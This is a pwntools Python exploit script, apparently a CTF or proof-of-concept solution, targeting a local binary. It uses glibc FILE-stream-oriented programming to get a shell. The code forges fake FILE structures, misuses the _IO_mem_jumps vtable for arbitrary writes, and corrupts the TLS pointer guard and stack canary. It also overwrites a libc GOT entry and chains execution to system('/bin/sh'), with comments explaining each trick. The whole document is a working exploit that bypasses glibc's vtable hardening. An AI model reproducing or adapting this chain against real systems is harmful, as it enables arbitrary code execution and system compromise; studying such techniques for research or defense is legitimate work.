from pwn import *

elf = context.binary = ELF('fsop_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = '''
                dir /home/john/Bench/poc2/libio/
                set breakpoint pending on
                b _IO_mem_sync
                b smash_me_baby
                b _IO_cleanup
        ''')
    else:
        return process(elf.path)

io = start()

io.recvuntil(b'libc leak: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

stack_guard = libc.address - 0x2898
__strchrnul_avx2_got = libc.address + 0x1f20b8

tmp_rand_target = libc.address + 0x1f2210

where = __strchrnul_avx2_got # we target this got address in glibc to hijack the code exectution from __libc_message!
what = libc.sym._IO_cleanup # early cleanup yeay! who has time waiting the main to exit ;)

where2 = stack_guard # overwrite stack canary in TLS inorder to trigger __stack_chk_fail intentionally.
what2 = libc.sym.system # this will trigger __stack_chk_fail but also we can use it as a vtable entry for our final FILE stream.

_flags = p32(0x0)
_flags_byte_hole = p32(0x0)
_IO_read_ptr = 0x0
_IO_read_end = 0x0
_IO_read_base = 0x0
_IO_write_base = what
_IO_write_ptr = _IO_write_base + what2
_IO_write_end = 0x0
_IO_buf_base = 0x0
_IO_buf_end = 0x0
_IO_save_base = 0x0
_IO_backup_base = 0x0
_IO_save_end = 0x0
_markers = 0x0

_chain = (libc.sym._IO_2_1_stdout_ + 8) - 104 # so our _chain => back to the heap in our fake FILE stream.

_fileno = p32(0x0)
_flags2 = p32(0x0)
_old_offset = 0x0
_cur_column = p16(0x0)
_vtable_offset = p8(0x0)
_shortbuf = p8(0x0)
_shortbuf_byte_hole = p32(0x0)
_lock = libc.address + 0x1f21f0
_offset = 0x0
_codecvt = 0x0
_wide_data = _lock
_freeres_list = 0x0
_freeres_buf = 0x0
__pad5 = 0x0
_mode = p32(0x0)
_unused2 = b'\x00'*0x14

# here is the trick, by shifting the vtable in the range of __libc_IO_vtables we are not aborting the program, it is totally allowed.
vtable = libc.sym._IO_mem_jumps + 0x48  # now __overflow points to _IO_mem_sync, our magical two arbitrary write function ;)

fs = _flags + _flags_byte_hole + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base) + p64(_IO_write_base) + p64(_IO_write_ptr) \
   + p64(_IO_write_end) + p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end) \
   + p64(_markers) + p64(_chain) + _fileno + _flags2 + p64(_old_offset) + _cur_column + _vtable_offset + _shortbuf + _shortbuf_byte_hole + p64(_lock) + p64(_offset) \
   + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf) + p64(__pad5) + _mode + _unused2 \
   + p64(vtable) + p64(0)*2 + p64(where) + p64(where2)

# ===========================================================
# Here we are done crafting our new overflowed FILE stream. |
# =========================================================== 

pointer_guard = libc.address - 0x2890
where = pointer_guard # defeat _IO_vtable_check by corrupting the pointer guard.
what = libc.sym._IO_vtable_check

where2 = libc.sym._IO_2_1_stdout_ + 1 # with this way we corrupt the least significant byte of our _chain pointer to point to a new final fake FILE stream.
what2 = 0x1 # we null out the least significant byte of our _chain pointer. (any value lower than 0x01xxxxxxx will do the trick but we have need a value > 0 inorder to trigger _IO_OVERFLOW)

_flags = p32(0x0)
_flags_byte_hole = p32(0x0)
_IO_read_ptr = 0x0
_IO_read_end = 0x0
_IO_read_base = 0x0
_IO_write_base = what # here is our _mode field for our fake final FILE stream. Note we take only the 4 least significant bytes because _mode is int. Although we can shift our fake final FILE stream by 8 bytes and avoid this collision, I'm too lazy for that, so I will hope _mode to take a negative value after some runs thank you ASLR for making it possible ;)
_IO_write_ptr = _IO_write_base + what2
_IO_write_end = 0x0
_IO_buf_base = stack_guard - 0x18  # here will be our vtable of our final fake FILE stream. offset for __overflow is 0x18. We already putted system as our stack canary & as an entry for our fake vtable ;)
_IO_buf_end = 0x0
_IO_save_base = 0x0
_IO_backup_base = 0x0
_IO_save_end = 0x0
_markers = 0x0

_chain = (libc.sym._IO_2_1_stdout_ + 8) - 104 # reuse this trick, we have changed our _chain only the fly to point to our final fake FSOP.

_fileno = p32(0x0)
_flags2 = p32(0x0)
_old_offset = 0x0
_cur_column = p16(0x0)
_vtable_offset = p8(0x0)
_shortbuf = p8(0x0)
_shortbuf_byte_hole = p32(0x0)
_lock = libc.address + 0x1f21f0
_offset = 0x0
_codecvt = 0x0
_wide_data = _lock
_freeres_list = 0x0
_freeres_buf = 0x0
__pad5 = 0x0
_mode = p32(0x0)
_unused2 = b'\x00'*0x14

# here is the trick, by shifting the vtable in the range of __libc_IO_vtables we are not aborting the program, it is totally allowed.
vtable = libc.sym._IO_mem_jumps + 0x48  # now __overflow points to _IO_mem_sync, our magical two arbitrary write function ;)

fake_fs = _flags + _flags_byte_hole + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base) + p64(_IO_write_base) + p64(_IO_write_ptr) \
   + p64(_IO_write_end) + p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end) \
   + p64(_markers) + p64(_chain) + _fileno + _flags2 + p64(_old_offset) + _cur_column + _vtable_offset + _shortbuf + _shortbuf_byte_hole + p64(_lock) + p64(_offset) \
   + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf) + p64(__pad5) + _mode + _unused2 \
   + p64(vtable) + p64(0)*2 + p64(where) + p64(where2)

final_fake_fs_IO_write_base = 0x0
final_fake_fs_IO_write_ptr  = 0x1 # we want it bigger than _IO_write_base inorder to trigger _IO_OVERFLOW.
final_fake_fs = b'/bin/sh\x00' + p8(0)*0x18 + p64(final_fake_fs_IO_write_base) + p64(final_fake_fs_IO_write_ptr) + p8(0)*0x68 # we can place here only 0xa0 bytes, for our _mode & vtable we have to put them inside our previous fake_fs

fix_fs_chunk_size = 0x1e1 # we don't actually care so much.
exploit = fit({
    0x18: p64(fix_fs_chunk_size) + fs,
    0x160: final_fake_fs,
    0x200: fake_fs
})

io.send(exploit)

io.interactive()